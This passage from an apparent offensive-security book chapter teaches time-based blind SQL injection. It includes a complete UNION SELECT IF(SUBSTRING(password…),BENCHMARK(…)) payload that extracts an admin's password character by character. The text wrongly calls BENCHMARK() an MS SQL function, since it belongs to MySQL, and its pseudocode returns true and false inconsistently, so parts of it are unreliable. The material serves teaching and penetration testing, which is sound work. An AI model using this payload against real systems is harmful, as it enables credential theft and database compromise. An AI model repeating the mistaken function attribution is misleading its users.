<div class="section" title="Data inference"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec43"/>Data inference</h1></div></div></div><p>Let's consider a simpler<a id="id300" class="indexterm"/> scenario where the application does not process the payload asynchronously. This is a far more common scenario. Typically, in a blind injection scenario we can use conditional statements in the injected query to infer data from the database. If the preceding example vulnerability was not asynchronous, we could introduce a significant delay in the response. Combine that with a traditional if-then-else and we can make assumptions about the data we are trying to retrieve.</p><p>The high-level pseudocode we'd use for this type of attack looks like this:</p><div class="informalexample"><pre class="programlisting">if <span class="strong"><strong>password</strong></span> starts with 'a'
  <span class="strong"><strong>delay(5 seconds)</strong></span>
else
  return false

if <span class="strong"><strong>password</strong></span> starts with 'aa'
  delay(5 seconds)
else
  <span class="strong"><strong>return true</strong></span>

if <span class="strong"><strong>password</strong></span> starts with 'ab'
  <span class="strong"><strong>delay(5 seconds)</strong></span>
else
  return false

[...]</pre></div><p>We could repeatedly check for the contents of the <code class="literal">password</code> field for a particular user, simply by observing the server response time. In the preceding pseudocode, after the first three iterations, we'd be able to infer that the <code class="literal">password</code> value begins with <code class="literal">ab</code>.</p><p>In order to generate that observable delay, in MS SQL we can ask the server to repeatedly perform an arbitrary operation using the <code class="literal">BENCHMARK()</code> function. If we use a CPU-intensive function, such as <code class="literal">MD5()</code>, we will introduce a significant and measurable delay in the return of the query.</p><p>The following MS SQL function can be used to induce a delay in the server response:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>BENCHMARK</strong></span>(5000000,<span class="strong"><strong>MD5</strong></span>(CHAR(99)))</pre></div><p>The benchmark operation will calculate the MD5 hash of the lowercase "c" character, represented by <code class="literal">CHAR(99)</code>, five million times. We may have to play with the number of iterations if the server is really powerful or if it is very slow. </p><p>If the number of iterations is too low, the server would return a result quickly, making it harder to determine if the injection was successful. We also don't want to introduce too much of a delay, as enumerating a database could take days.</p><p>The final attack payload will <a id="id301" class="indexterm"/>combine the <code class="literal">IF</code> statement and the benchmark operation. We will also use the <code class="literal">UNION</code> keyword to combine the existing <code class="literal">SELECT</code> with our very own:</p><div class="informalexample"><pre class="programlisting">' UNION SELECT IF(SUBSTRING(<span class="strong"><strong>password</strong></span>,1,1) = CHAR(97),BENCHMARK(5000000,MD5(CHAR(99))),null) FROM users WHERE role = 'admin';--</pre></div><p>The backend SQL query to be executed will, once again, look like the following:</p><div class="informalexample"><pre class="programlisting">SELECT * FROM users WHERE user = 'Dade' <span class="strong"><strong>UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(97),BENCHMARK(5000000,MD5(CHAR(99))),null) FROM users WHERE role = 'admin';--</strong></span>'</pre></div><p>If there is a significant delay in the response, we can infer that the admin user password begins with lowercase "a." To find the entire value, we'd have to loop over hundreds of queries and modify the <code class="literal">SUBSTRING()</code> parameters, and "walk" through the string as more of the password value is uncovered.</p></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec44"/>Summary</h1></div></div></div><p>In this chapter, we've used a pretty common SQL injection example to showcase potential issues with vulnerability discovery when the application does not provide any kind of feedback to the attacker. There are ways around these types of obstacles and some tricks can even exfiltrate sensitive data asynchronously. We've also looked at how to manually retrieve data through inference in a blind injection scenario.</p><p>The key takeaway here is the ability to alter the application behavior in a way that is measurable by the attacker. Even some of the more secure application development environments, which aggressively filter outgoing traffic, tend to allow at least DNS UDP packets to fly through. Filtering egress DNS queries is a difficult exercise and I don't envy any security team charged with doing so. As attackers, once again we are able to take full advantage of these limitations and as I've shown in the earlier example, fully compromise the application by exploiting a difficult-to-discover vulnerability.</p><p>In the following chapter, we will look at automating some of this activity, including leveraging Burp's Collaborator feature to make out-of-band discovery easier.</p></div></body></html>